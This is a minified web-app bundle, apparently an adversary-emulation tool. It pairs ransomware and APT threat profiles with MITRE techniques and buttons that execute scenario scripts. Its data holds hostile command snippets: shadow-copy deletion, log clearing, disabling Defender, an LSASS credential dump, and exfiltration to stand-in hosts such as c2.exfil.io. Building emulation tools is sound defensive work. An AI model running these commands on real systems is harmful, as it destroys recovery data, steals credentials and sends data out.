module.exports=[39726,a=>{"use strict";let b=[{id:"lockbit",name:"LockBit 3.0",aliases:["LockBit Black"],description:"One of the most prolific RaaS groups. LockBit 3.0 uses a modular ransomware payload and extensive living-off-the-land techniques.",ttps:[{id:"T1047",technique:"Windows Management Instrumentation",tactic:"Execution",description:"Uses WMI to delete Volume Shadow Copies to prevent recovery.",commandSnippet:"Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }",scriptPath:"scenarios/lockbit/wmi_shadowcopy.ps1"},{id:"T1070.001",technique:"Indicator Removal: Clear Windows Event Logs",tactic:"Defense Evasion",description:"Clears security, system, and application logs to hide activity.",commandSnippet:"wevtutil cl Security; wevtutil cl System; wevtutil cl Application",scriptPath:"scenarios/lockbit/log_clear.ps1"},{id:"T1112",technique:"Modify Registry",tactic:"Defense Evasion",description:"Modifies registry to disable Windows Defender defenses.",commandSnippet:"Set-MpPreference -DisableRealtimeMonitoring $true",scriptPath:"scenarios/lockbit/disable_defender.ps1",revertScriptPath:"scenarios/lockbit/disable_defender_revert.ps1"},{id:"T1490",technique:"Inhibit System Recovery",tactic:"Impact",description:"Disables boot recovery options using bcdedit.",commandSnippet:"bcdedit /set {default} recoveryenabled No",scriptPath:"scenarios/lockbit/bcdedit_recovery.ps1",revertScriptPath:"scenarios/lockbit/bcdedit_recovery_revert.ps1"}]},{id:"generic-discovery",name:"Generic Discovery Modules",aliases:["Red Team Ops","Manual Recon"],description:"Common discovery commands used by various threat actors to enumerate the environment.",ttps:[{id:"T1016",technique:"System Network Configuration Discovery",tactic:"Discovery",description:"Enumerates network interfaces and IP configurations.",commandSnippet:"ipconfig /all",scriptPath:"scenarios/library/discovery_network.ps1"},{id:"T1069",technique:"Permission Groups Discovery",tactic:"Discovery",description:"Enumerates domain groups and members.",commandSnippet:'net group /domain "Domain Admins"',scriptPath:"scenarios/library/discovery_groups.ps1"},{id:"T1033",technique:"System Owner/User Discovery",tactic:"Discovery",description:"Identifies the current user context.",commandSnippet:"whoami /all",scriptPath:"scenarios/library/discovery_user.ps1"},{id:"T1087",technique:"Account Discovery",tactic:"Discovery",description:"Enumerates all users in the domain.",commandSnippet:"Get-ADUser -Filter * | Select-Object Name,SamAccountName",scriptPath:"scenarios/library/discovery_ad_users.ps1"}]},{id:"blackbasta",name:"Black Basta",aliases:["Black Basta Syndicate"],description:"Emerged in 2022 as a potent RaaS. Known for spearphishing, Qakbot distribution, and using Backstab to disable EDR.",ttps:[{id:"T1566",technique:"Phishing",tactic:"Initial Access",description:"Uses spearphishing emails with malicious ZIP attachments.",commandSnippet:"# Simulated phishing delivery",scriptPath:"scenarios/blackbasta/phishing_sim.ps1"},{id:"T1562.001",technique:"Impair Defenses: Disable or Modify Tools",tactic:"Defense Evasion",description:"Uses Backstab tool to disable EDR products.",commandSnippet:'Stop-Service -Name "Sense" -Force',scriptPath:"scenarios/blackbasta/disable_edr.ps1",revertScriptPath:"scenarios/blackbasta/disable_edr_revert.ps1"},{id:"T1068",technique:"Exploitation for Privilege Escalation",tactic:"Privilege Escalation",description:"Uses exploits like Zerologon, NoPac, PrintNightmare.",commandSnippet:"# Invoke-ZeroLogon simulation",scriptPath:"scenarios/blackbasta/priv_esc_exploit.ps1"},{id:"T1021.001",technique:"Remote Services: RDP",tactic:"Lateral Movement",description:"Uses valid accounts for RDP access.",commandSnippet:"mstsc /v:<TARGET_IP>",scriptPath:"scenarios/blackbasta/rdp_lateral.ps1",inputParams:[{name:"TargetIP",label:"Target IP Address",type:"ip",placeholder:"10.0.0.1",required:!0}]}]},{id:"alphv",name:"ALPHV / BlackCat",aliases:["ALPHV","BlackCat","Noberus"],description:"First major ransomware written in Rust. Highly customizable with multiple extortion methods.",ttps:[{id:"T1078",technique:"Valid Accounts",tactic:"Initial Access",description:"Uses ProxyShell vulnerabilities for initial access.",commandSnippet:"# ProxyShell exploitation simulation",scriptPath:"scenarios/alphv/proxyshell_sim.ps1"},{id:"T1059.001",technique:"PowerShell",tactic:"Execution",description:"Uses PowerShell to delete shadow copies and clear logs.",commandSnippet:"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject",scriptPath:"scenarios/alphv/ps_execution.ps1"},{id:"T1053",technique:"Scheduled Task/Job",tactic:"Execution",description:"Creates scheduled tasks to deploy ransomware via GPO.",commandSnippet:'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',scriptPath:"scenarios/alphv/schtask_create.ps1",revertScriptPath:"scenarios/alphv/schtask_create_revert.ps1"}]},{id:"avoslocker",name:"AvosLocker",aliases:["Avos","AvosLocker RaaS"],description:"RaaS known for exploiting public-facing applications and using legitimate remote access tools.",ttps:[{id:"T1190",technique:"Exploit Public-Facing Application",tactic:"Initial Access",description:"Exploits vulnerable web applications for entry.",commandSnippet:"# Web exploit simulation",scriptPath:"scenarios/avoslocker/webexploit_sim.ps1"},{id:"T1490",technique:"Inhibit System Recovery",tactic:"Impact",description:"Deletes shadow copies to prevent recovery.",commandSnippet:"vssadmin delete shadows /all /quiet",scriptPath:"scenarios/avoslocker/delete_shadows.ps1"},{id:"T1219",technique:"Remote Access Tools",tactic:"Command and Control",description:"Uses tools like AnyDesk or TeamViewer for persistence.",commandSnippet:'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',scriptPath:"scenarios/avoslocker/rat_install.ps1",inputParams:[{name:"C2URL",label:"C2 Server URL",type:"url",placeholder:"http://10.0.0.1:443/beacon",required:!0}]},{id:"T1486",technique:"Data Encrypted for Impact",tactic:"Impact",description:"Encrypts victim data to demand ransom.",commandSnippet:"# Encryption simulation (safe mode)",scriptPath:"scenarios/avoslocker/encrypt_sim.ps1"}]},{id:"bianlian",name:"BianLian",aliases:["BianLian Gang"],description:"Go-based ransomware known for sandbox evasion and spreading via removable media.",ttps:[{id:"T1497",technique:"Virtualization/Sandbox Evasion",tactic:"Defense Evasion",description:"Detects and avoids virtualization environments.",commandSnippet:"Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer",scriptPath:"scenarios/bianlian/vm_detect.ps1"},{id:"T1027.002",technique:"Software Packing",tactic:"Defense Evasion",description:"Uses software packing to conceal code.",commandSnippet:"# Packed payload simulation",scriptPath:"scenarios/bianlian/packed_payload.ps1"},{id:"T1091",technique:"Replication Through Removable Media",tactic:"Lateral Movement",description:"Spreads via USB and autorun.",commandSnippet:'Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"',scriptPath:"scenarios/bianlian/usb_spread.ps1"},{id:"T1486",technique:"Data Encrypted for Impact",tactic:"Impact",description:"Encrypts data for extortion.",commandSnippet:"# Encryption simulation (safe mode)",scriptPath:"scenarios/bianlian/encrypt_sim.ps1",revertScriptPath:"scenarios/bianlian/encrypt_sim_revert.ps1"}]},{id:"clop",name:"Cl0p",aliases:["Cl0p","TA505","FIN11"],description:"Notorious for exploiting zero-days (MOVEit, Accellion FTA) and large-scale data theft.",ttps:[{id:"T1190",technique:"Exploit Public-Facing Application",tactic:"Initial Access",description:"Exploits CVEs like MOVEit (CVE-2023-34362).",commandSnippet:"# MOVEit exploit simulation",scriptPath:"scenarios/clop/moveit_exploit.ps1"},{id:"T1547",technique:"Boot or Logon Autostart Execution",tactic:"Persistence",description:"Creates registry run entries for persistence.",commandSnippet:'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',scriptPath:"scenarios/clop/registry_persist.ps1",revertScriptPath:"scenarios/clop/registry_persist_revert.ps1"},{id:"T1070.001",technique:"Clear Windows Event Logs",tactic:"Defense Evasion",description:"Clears event logs to hide activity.",commandSnippet:"wevtutil cl Security; wevtutil cl System",scriptPath:"scenarios/clop/log_clear.ps1"},{id:"T1567",technique:"Exfiltration Over Web Service",tactic:"Exfiltration",description:"Exfiltrates data via DEWMODE webshell.",commandSnippet:"# Webshell exfil simulation",scriptPath:"scenarios/clop/webshell_exfil.ps1"}]},{id:"conti",name:"Conti",aliases:["Conti Team","Wizard Spider"],description:"Major RaaS operation until 2022. Known for fast encryption and double extortion.",ttps:[{id:"T1486",technique:"Data Encrypted for Impact",tactic:"Impact",description:"Fast, multi-threaded file encryption.",commandSnippet:"# Fast encryption simulation",scriptPath:"scenarios/conti/encrypt_sim.ps1"},{id:"T1567",technique:"Exfiltration Over Web Service",tactic:"Exfiltration",description:"Exfiltrates data before encryption for double extortion.",commandSnippet:'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',scriptPath:"scenarios/conti/exfil_web.ps1",inputParams:[{name:"ExfilURL",label:"Exfiltration URL",type:"url",placeholder:"http://10.0.0.1:8080/upload",required:!0}]}]},{id:"dragonforce",name:"DragonForce",aliases:["DragonForce Malaysia"],description:"Hacktivist-turned-ransomware group known for self-deleting payloads.",ttps:[{id:"T1562.001",technique:"Impair Defenses: Disable or Modify Tools",tactic:"Defense Evasion",description:"Disables Windows Defender before encryption.",commandSnippet:"Set-MpPreference -DisableRealtimeMonitoring $true",scriptPath:"scenarios/dragonforce/disable_defender.ps1",revertScriptPath:"scenarios/dragonforce/disable_defender_revert.ps1"},{id:"T1070.004",technique:"Indicator Removal: File Deletion",tactic:"Defense Evasion",description:"Self-deletes ransomware binary after execution.",commandSnippet:"Remove-Item -Path $MyInvocation.MyCommand.Path -Force",scriptPath:"scenarios/dragonforce/self_delete.ps1"},{id:"T1486",technique:"Data Encrypted for Impact",tactic:"Impact",description:"Encrypts files for ransom.",commandSnippet:"# Encryption simulation",scriptPath:"scenarios/dragonforce/encrypt_sim.ps1"}]},{id:"safepay",name:"SafePay",aliases:["SafePay Ransomware"],description:"RaaS gaining access via RDP and using UAC bypass via CMSTPLUA COM object.",ttps:[{id:"T1133",technique:"External Remote Services",tactic:"Initial Access",description:"Gains access via exposed RDP services.",commandSnippet:"Test-NetConnection -ComputerName <TARGET> -Port 3389",scriptPath:"scenarios/safepay/rdp_scan.ps1",inputParams:[{name:"TargetIP",label:"Target IP or Subnet",type:"subnet",placeholder:"10.0.0.0/24",required:!0}]},{id:"T1548.002",technique:"Abuse Elevation Control Mechanism: Bypass UAC",tactic:"Privilege Escalation",description:"Bypasses UAC using CMSTPLUA COM object.",commandSnippet:"# UAC bypass via CMSTPLUA simulation",scriptPath:"scenarios/safepay/uac_bypass.ps1",revertScriptPath:"scenarios/safepay/uac_bypass_revert.ps1"},{id:"T1003",technique:"Credential Dumping",tactic:"Credential Access",description:"Harvests credentials for lateral movement.",commandSnippet:"rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",scriptPath:"scenarios/safepay/cred_dump.ps1"},{id:"T1048",technique:"Exfiltration Over Alternative Protocol",tactic:"Exfiltration",description:"Uses FTP (FileZilla) for data exfiltration.",commandSnippet:"ftp -s:script.txt ftp.exfil.io",scriptPath:"scenarios/safepay/ftp_exfil.ps1",inputParams:[{name:"FTPServer",label:"FTP Server IP",type:"ip",placeholder:"10.0.0.1",required:!0}]}]}];a.s(["CAMPAIGNS",0,[{id:"full-killchain-campaign",adversary:"Red Team Ops",name:"Full Killchain Emulation",description:"A complete end-to-end simulation from Initial Access to Exfiltration.",steps:["initial-access","persistence-reg","priv-esc","defense-evasion","lateral-dc","c2-check","exfil-dns"]},{id:"apt28-campaign",adversary:"APT28",name:"Operation XAgent",description:"Simulates a typical APT28 intrusion chain involving recon, privilege escalation, and lateral movement targeting high-value infrastructure.",steps:["recon-local","priv-esc","lateral-dc","cred-dump"]},{id:"apt1-campaign",adversary:"APT1",name:"Operation Comment Crew",description:"A noise-heavy campaign focusing on persistence and credential harvesting.",steps:["recon-local","persistence-reg","cred-dump"]},{id:"scattered-spider-campaign",adversary:"Scattered Spider",name:"Cloud & Identity Siege",description:"Focuses on connecting to C2, evading defenses, and establishing persistence for long-term access.",steps:["c2-check","defense-evasion","persistence-reg","priv-esc"]},{id:"apt45-campaign",adversary:"APT45",name:"North Korean Info Stealer",description:"Rapid collection of information and credentials.",steps:["recon-local","defense-evasion","cred-dump"]},{id:"mustang-panda-campaign",adversary:"Mustang Panda",name:"PlugX Propagation",description:"Lateral movement and C2 beaconing focus.",steps:["recon-local","lateral-dc","c2-check"]},{id:"wizard-spider-campaign",adversary:"Wizard Spider",name:"Conti/Ryuk Precursor",description:"The prelude to a ransomware attack: Recon, C2 verification, and spreading via SMB.",steps:["recon-local","c2-check","lateral-dc","defense-evasion"]},{id:"wsl-threat-campaign",adversary:"Scattered Spider",name:"WSL Subsystem Exploitation",description:"Leverages Windows Subsystem for Linux to bypass security controls, establish persistence, and exfiltrate data using native Linux tooling.",steps:["wsl-recon","wsl-defense-evasion","wsl-file-access","wsl-persistence","wsl-exfil"]}],"SCENARIOS",0,[{id:"recon-local",name:"Host Reconnaissance (PowerShell)",adversary:"Red Team Ops",description:"Enumerates local network connections and running processes to identify key assets.",mitreTechniques:[{id:"T1049",name:"System Network Connections Discovery",url:"https://attack.mitre.org/techniques/T1049/"},{id:"T1057",name:"Process Discovery",url:"https://attack.mitre.org/techniques/T1057/"}],scriptPath:"scenarios/recon_local.ps1",estimatedDuration:"2 mins",difficulty:"Easy"},{id:"priv-esc",name:"Privilege Escalation Check",adversary:"APT28",description:"Checks current privileges and simulates enabling SeDebugPrivilege.",mitreTechniques:[{id:"T1134",name:"Access Token Manipulation",url:"https://attack.mitre.org/techniques/T1134/"}],scriptPath:"scenarios/priv_esc.ps1",estimatedDuration:"1 min",difficulty:"Medium"},{id:"lateral-dc",name:"Lateral Movement to Domain Controller",adversary:"APT28",description:"Attempts to verify connectivity and simulate administrative share access to the DC (10.160.37.16).",mitreTechniques:[{id:"T1021.002",name:"Remote Services: SMB",url:"https://attack.mitre.org/techniques/T1021/002/"}],scriptPath:"scenarios/lateral_dc.ps1",estimatedDuration:"5 mins",difficulty:"Hard"},{id:"c2-check",name:"C2 Connectivity Check",adversary:"Scattered Spider",description:"Verifies DNS resolution and TCP connectivity to the configured C2 infrastructure.",mitreTechniques:[{id:"T1071",name:"Application Layer Protocol",url:"https://attack.mitre.org/techniques/T1071/"}],scriptPath:"scenarios/c2_check.ps1",estimatedDuration:"2 mins",difficulty:"Easy"},{id:"persistence-reg",name:"Persistence (Registry)",adversary:"APT1",description:"Creates a simulated malicious Run key in HKCU.",mitreTechniques:[{id:"T1547.001",name:"Registry Run Keys",url:"https://attack.mitre.org/techniques/T1547/001/"}],scriptPath:"scenarios/persistence.ps1",estimatedDuration:"1 min",difficulty:"Medium"},{id:"defense-evasion",name:"Defense Evasion (Clear Logs)",adversary:"Red Team Ops",description:"Simulates clearing the Security Event Log.",mitreTechniques:[{id:"T1070.001",name:"Indicator Removal: Clear Windows Event Logs",url:"https://attack.mitre.org/techniques/T1070/001/"}],scriptPath:"scenarios/defense_evasion.ps1",estimatedDuration:"2 mins",difficulty:"Medium"},{id:"cred-dump",name:"Credential Dumping (Active)",adversary:"APT1",description:"Simulates dumping LSASS memory using rundll32 and comsvcs.dll.",mitreTechniques:[{id:"T1003.001",name:"OS Credential Dumping: LSASS Memory",url:"https://attack.mitre.org/techniques/T1003/001/"}],scriptPath:"scenarios/cred_dump.ps1",estimatedDuration:"3 mins",difficulty:"Hard"},{id:"initial-access",name:"Initial Access (Payload Staging)",adversary:"APT45",description:"Simulates dropping a payload (output.wav) to C:\\temp for exfiltration.",mitreTechniques:[{id:"T1105",name:"Ingress Tool Transfer",url:"https://attack.mitre.org/techniques/T1105/"}],scriptPath:"scenarios/initial_access.ps1",estimatedDuration:"1 min",difficulty:"Easy"},{id:"exfil-dns",name:"Exfiltration via DNS",adversary:"APT45",description:"Reads the staged payload and exfiltrates it via DNS A record queries.",mitreTechniques:[{id:"T1048.003",name:"Exfiltration Over Alternative Protocol: DNS",url:"https://attack.mitre.org/techniques/T1048/003/"}],scriptPath:"scenarios/exfil_dns.ps1",estimatedDuration:"3 mins",difficulty:"Hard"},{id:"wsl-recon",name:"WSL Reconnaissance & Enumeration",adversary:"Red Team Ops",description:"Executes Linux reconnaissance commands via WSL, accessing Windows filesystem through /mnt/c mount points.",mitreTechniques:[{id:"T1202",name:"Indirect Command Execution",url:"https://attack.mitre.org/techniques/T1202/"},{id:"T1083",name:"File and Directory Discovery",url:"https://attack.mitre.org/techniques/T1083/"}],scriptPath:"scenarios/wsl/wsl_recon.ps1",estimatedDuration:"2 mins",difficulty:"Easy"},{id:"wsl-defense-evasion",name:"WSL Defense Evasion",adversary:"Scattered Spider",description:"Uses wsl.exe to execute commands, bypassing Windows command-line logging and security controls.",mitreTechniques:[{id:"T1202",name:"Indirect Command Execution",url:"https://attack.mitre.org/techniques/T1202/"},{id:"T1027",name:"Obfuscated Files or Information",url:"https://attack.mitre.org/techniques/T1027/"}],scriptPath:"scenarios/wsl/wsl_defense_evasion.ps1",estimatedDuration:"2 mins",difficulty:"Medium"},{id:"wsl-reverse-shell",name:"WSL Reverse Shell",adversary:"APT28",description:"Establishes a reverse shell using bash and netcat from within WSL subsystem.",mitreTechniques:[{id:"T1059.004",name:"Command and Scripting Interpreter: Unix Shell",url:"https://attack.mitre.org/techniques/T1059/004/"}],scriptPath:"scenarios/wsl/wsl_reverse_shell.ps1",estimatedDuration:"3 mins",difficulty:"Hard"},{id:"wsl-file-access",name:"WSL File Access & Staging",adversary:"APT1",description:"Accesses and stages Windows files via WSL mount points for collection and exfiltration.",mitreTechniques:[{id:"T1005",name:"Data from Local System",url:"https://attack.mitre.org/techniques/T1005/"},{id:"T1074.001",name:"Data Staged: Local Data Staging",url:"https://attack.mitre.org/techniques/T1074/001/"}],scriptPath:"scenarios/wsl/wsl_file_access.ps1",estimatedDuration:"3 mins",difficulty:"Medium"},{id:"wsl-persistence",name:"WSL Persistence (Cron)",adversary:"Wizard Spider",description:"Establishes persistence via cron jobs within WSL that execute when the subsystem is running.",mitreTechniques:[{id:"T1053.003",name:"Scheduled Task/Job: Cron",url:"https://attack.mitre.org/techniques/T1053/003/"}],scriptPath:"scenarios/wsl/wsl_persistence.ps1",estimatedDuration:"2 mins",difficulty:"Medium"},{id:"wsl-exfil",name:"WSL Exfiltration (curl/wget)",adversary:"APT45",description:"Uses Linux tools (curl, wget, netcat) from WSL to exfiltrate data to C2 server.",mitreTechniques:[{id:"T1048",name:"Exfiltration Over Alternative Protocol",url:"https://attack.mitre.org/techniques/T1048/"},{id:"T1567",name:"Exfiltration Over Web Service",url:"https://attack.mitre.org/techniques/T1567/"}],scriptPath:"scenarios/wsl/wsl_exfil.ps1",estimatedDuration:"3 mins",difficulty:"Hard"}],"THREAT_ACTORS",0,b])},46845,a=>{a.v({badge:"page-module___8aEwW__badge",header:"page-module___8aEwW__header",scenariosGrid:"page-module___8aEwW__scenariosGrid",status:"page-module___8aEwW__status",tag:"page-module___8aEwW__tag"})},40777,a=>{"use strict";var b=a.i(87924),c=a.i(72131),d=a.i(38246),e=a.i(39726),f=a.i(46845);let g={ip:a=>/^(\d{1,3}\.){3}\d{1,3}$/.test(a)&&a.split(".").every(a=>255>=parseInt(a)),hostname:a=>/^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})*$/.test(a),url:a=>/^https?:\/\/.+/.test(a),domain:a=>/^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/.test(a),subnet:a=>/^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(a),text:()=>!0};function h(){let[a,d]=(0,c.useState)(null),[f,h]=(0,c.useState)(null),[i,j]=(0,c.useState)(null),[k,l]=(0,c.useState)({}),[m,n]=(0,c.useState)(new Set),[o,p]=(0,c.useState)({}),[q,r]=(0,c.useState)({}),s=e.THREAT_ACTORS.find(b=>b.id===a),t=async a=>{if(a.scriptPath&&(a=>{if(!a.inputParams)return!0;let b={},c=!0;for(let d of a.inputParams){let e=o[a.id]?.[d.name]||"";d.required&&!e?(b[d.name]=!0,c=!1):e&&!g[d.type](e)&&(b[d.name]=!0,c=!1)}return r(c=>({...c,[a.id]:b})),c})(a)){h(a.id);try{let b={};if(a.inputParams)for(let c of a.inputParams)b[c.name]=o[a.id]?.[c.name]||"";let c=await fetch("/api/execute",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({scriptPath:a.scriptPath,params:b})}),d=await c.json();l(b=>({...b,[a.id]:d.output||d.error})),n(b=>new Set(b).add(a.id))}catch(b){l(b=>({...b,[a.id]:"Failed to execute TTP."}))}finally{h(null)}}},u=async a=>{if(a.revertScriptPath){j(a.id);try{let b=await fetch("/api/execute",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({scriptPath:a.revertScriptPath,params:{}})}),c=await b.json();l(b=>({...b,[a.id]:`[REVERT OUTPUT]
${c.output||c.error}`})),n(b=>{let c=new Set(b);return c.delete(a.id),c})}catch(b){l(b=>({...b,[a.id]:"Failed to revert TTP."}))}finally{j(null)}}};return s?(0,b.jsxs)("div",{style:{animation:"fadeIn 0.3s ease"},children:[(0,b.jsx)("button",{onClick:()=>d(null),className:"btn",style:{marginBottom:"1rem",padding:"0.5rem 1rem"},children:"â† BACK TO LIBRARY"}),(0,b.jsxs)("div",{className:"card",style:{border:"1px solid var(--primary)",boxShadow:"0 0 15px rgba(0, 255, 65, 0.1)"},children:[(0,b.jsx)("h1",{className:"mono text-primary",style:{fontSize:"2rem",marginBottom:"0.5rem"},children:s.name}),s.aliases.length>0&&(0,b.jsxs)("p",{className:"mono text-dim",style:{marginBottom:"1rem"},children:["ALIASES: ",s.aliases.join(", ")]}),(0,b.jsx)("p",{style:{lineHeight:"1.6",marginBottom:"2rem",fontSize:"1.1rem"},children:s.description}),(0,b.jsx)("h3",{className:"mono",style:{borderBottom:"1px solid #333",paddingBottom:"0.5rem",marginBottom:"1rem"},children:"ATTRIBUTED TTPs"}),(0,b.jsx)("div",{style:{display:"grid",gap:"1rem"},children:s.ttps.map(a=>(0,b.jsxs)("div",{style:{background:"rgba(255,255,255,0.03)",padding:"1rem",borderLeft:`2px solid ${m.has(a.id)?"#ff6b35":"var(--primary)"}`},children:[(0,b.jsxs)("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"0.5rem"},children:[(0,b.jsx)("span",{className:"mono text-primary",style:{fontWeight:"bold"},children:a.id}),(0,b.jsxs)("div",{style:{display:"flex",gap:"0.5rem",alignItems:"center"},children:[(0,b.jsx)("span",{className:"mono text-dim",style:{fontSize:"0.8rem"},children:a.tactic.toUpperCase()}),m.has(a.id)&&(0,b.jsx)("span",{style:{background:"#ff6b35",color:"#000",padding:"0.1rem 0.4rem",fontSize:"0.7rem",fontWeight:"bold"},children:"EXECUTED"})]})]}),(0,b.jsx)("h4",{style:{marginBottom:"0.5rem"},children:a.technique}),(0,b.jsx)("p",{className:"text-dim",style:{fontSize:"0.9rem",marginBottom:"1rem"},children:a.description}),(0,b.jsx)("div",{className:"code-block",style:{background:"#000",padding:"0.5rem",fontFamily:"monospace",fontSize:"0.8rem",color:"#0f0",marginBottom:"1rem",overflowX:"auto"},children:a.commandSnippet}),a.inputParams&&a.inputParams.length>0&&(0,b.jsx)("div",{style:{marginBottom:"1rem",display:"grid",gap:"0.5rem"},children:a.inputParams.map(c=>(0,b.jsxs)("div",{children:[(0,b.jsxs)("label",{className:"mono text-dim",style:{fontSize:"0.8rem",display:"block",marginBottom:"0.25rem"},children:[c.label," ",c.required&&(0,b.jsx)("span",{style:{color:"#ff3333"},children:"*"})]}),(0,b.jsx)("input",{type:"text",placeholder:c.placeholder,value:o[a.id]?.[c.name]||"",onChange:b=>{var d,e,f;return d=a.id,e=c.name,f=b.target.value,void(p(a=>({...a,[d]:{...a[d]||{},[e]:f}})),q[d]?.[e]&&r(a=>({...a,[d]:{...a[d]||{},[e]:!1}})))},style:{width:"100%",padding:"0.5rem",background:"#111",border:`1px solid ${q[a.id]?.[c.name]?"#ff3333":"#333"}`,color:"#fff",fontFamily:"monospace",fontSize:"0.85rem"}}),q[a.id]?.[c.name]&&(0,b.jsxs)("span",{style:{color:"#ff3333",fontSize:"0.75rem"},children:["Invalid ",c.type," format"]})]},c.name))}),(0,b.jsxs)("div",{style:{display:"flex",gap:"0.5rem",flexWrap:"wrap"},children:[a.scriptPath&&(0,b.jsx)("button",{onClick:()=>t(a),className:"btn",disabled:f===a.id,style:{fontSize:"0.8rem",padding:"0.3rem 0.8rem"},children:f===a.id?"EXECUTING...":"EXECUTE"}),a.revertScriptPath&&m.has(a.id)&&(0,b.jsx)("button",{onClick:()=>u(a),disabled:i===a.id,style:{fontSize:"0.8rem",padding:"0.3rem 0.8rem",background:"#ff6b35",color:"#000",border:"none",cursor:"pointer",fontWeight:"bold"},children:i===a.id?"REVERTING...":"REVERT"}),!a.scriptPath&&(0,b.jsx)("span",{className:"text-dim mono",style:{fontSize:"0.8rem"},children:"PENDING IMPLEMENTATION"})]}),k[a.id]&&(0,b.jsx)("div",{style:{marginTop:"1rem",background:"#111",padding:"0.5rem",border:"1px solid #333"},children:(0,b.jsx)("pre",{style:{margin:0,whiteSpace:"pre-wrap",fontSize:"0.8rem",color:"#ccc"},children:k[a.id]})})]},a.id))})]})]}):(0,b.jsx)("div",{children:(0,b.jsx)("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill, minmax(300px, 1fr))",gap:"1.5rem"},children:e.THREAT_ACTORS.map(a=>(0,b.jsxs)("div",{className:"card",style:{cursor:"pointer",transition:"transform 0.2s",border:"1px solid #333"},onClick:()=>d(a.id),onMouseEnter:a=>a.currentTarget.style.borderColor="var(--primary)",onMouseLeave:a=>a.currentTarget.style.borderColor="#333",children:[(0,b.jsx)("div",{style:{display:"flex",justifyContent:"space-between",marginBottom:"1rem"},children:(0,b.jsx)("span",{className:"mono text-primary",style:{fontSize:"1.2rem"},children:a.name})}),(0,b.jsxs)("p",{className:"text-dim",style:{fontSize:"0.9rem",lineHeight:"1.5"},children:[a.description.substring(0,100),"..."]}),(0,b.jsx)("div",{style:{marginTop:"1rem",display:"flex",gap:"0.5rem"},children:(0,b.jsxs)("span",{className:"tag",children:[a.ttps.length," TTPs"]})})]},a.id))})})}function i(){let[a,g]=(0,c.useState)("threats");return(0,b.jsxs)("main",{className:"container",children:[(0,b.jsxs)("div",{style:{display:"flex",gap:"2rem",marginBottom:"2rem",borderBottom:"1px solid #333",paddingBottom:"1rem"},children:[(0,b.jsx)("button",{onClick:()=>g("threats"),className:"mono",style:{background:"none",border:"none",color:"threats"===a?"var(--primary)":"#666",fontSize:"1.2rem",cursor:"pointer",padding:"0.5rem 0",borderBottom:"threats"===a?"2px solid var(--primary)":"2px solid transparent",transition:"all 0.2s"},children:"THREAT LIBRARY"}),(0,b.jsx)("button",{onClick:()=>g("scenarios"),className:"mono",style:{background:"none",border:"none",color:"scenarios"===a?"var(--primary)":"#666",fontSize:"1.2rem",cursor:"pointer",padding:"0.5rem 0",borderBottom:"scenarios"===a?"2px solid var(--primary)":"2px solid transparent",transition:"all 0.2s"},children:"GUIDED SCENARIOS"})]}),"threats"===a?(0,b.jsx)(h,{}):(0,b.jsx)("section",{style:{animation:"fadeIn 0.3s ease"},children:(0,b.jsx)("div",{className:f.default.scenariosGrid,children:e.SCENARIOS.map(a=>(0,b.jsxs)("div",{className:"card",style:{border:"1px solid #333"},onMouseEnter:a=>a.currentTarget.style.borderColor="var(--primary)",onMouseLeave:a=>a.currentTarget.style.borderColor="#333",children:[(0,b.jsxs)("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"1rem"},children:[(0,b.jsx)("span",{className:"badge",style:{color:"var(--secondary)",borderColor:"var(--secondary)"},children:a.adversary}),(0,b.jsx)("span",{className:"mono text-dim",style:{fontSize:"0.8rem"},children:a.difficulty})]}),(0,b.jsx)("h2",{className:"mono text-primary",style:{fontSize:"1.2rem",marginBottom:"0.5rem"},children:a.name}),(0,b.jsxs)("p",{className:"text-dim",style:{fontSize:"0.9rem",marginBottom:"1.5rem",lineHeight:"1.5"},children:[a.description.substring(0,120),"..."]}),(0,b.jsxs)("div",{style:{marginBottom:"1.5rem"},children:[(0,b.jsx)("p",{className:"mono text-dim",style:{fontSize:"0.75rem",marginBottom:"0.5rem"},children:"MITRE ATT&CK:"}),(0,b.jsx)("div",{style:{display:"flex",gap:"0.5rem",flexWrap:"wrap"},children:a.mitreTechniques.map(a=>(0,b.jsx)("span",{className:"tag",title:a.name,children:a.id},a.id))})]}),(0,b.jsx)(d.default,{href:`/scenario/${a.id}`,className:"btn",style:{display:"block",textAlign:"center",textDecoration:"none"},children:"INITIALIZE"})]},a.id))})})]})}a.s(["default",()=>i],40777)}];

//# sourceMappingURL=src_02fff223._.js.map